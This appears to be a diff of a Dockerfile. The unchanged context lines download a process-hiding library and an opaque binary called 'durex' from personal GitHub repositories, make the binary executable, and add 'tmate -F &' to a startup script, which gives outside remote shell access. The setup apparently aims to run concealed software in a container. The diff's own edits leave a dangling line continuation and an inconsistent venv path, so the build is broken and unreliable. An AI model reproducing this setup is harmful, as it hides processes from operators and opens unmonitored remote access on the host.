@@ -10,7 +10,8 @@ RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
 FROM base as venv_setup
 
 # Buat direktori untuk SSH
-RUN mkdir /run/sshd
+RUN mkdir /run/sshd \
+    
     
 RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
     && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
@@ -18,7 +19,7 @@ RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
     && chmod +x durex
 
 
-RUN python3 -m venv /myenv \
+RUN python3 -m venv myenv \
     && echo 'source /myenv/bin/activate' >> /openssh.sh \
     && echo 'sleep 5' >> /openssh.sh \
     && echo "tmate -F &" >> /openssh.sh \
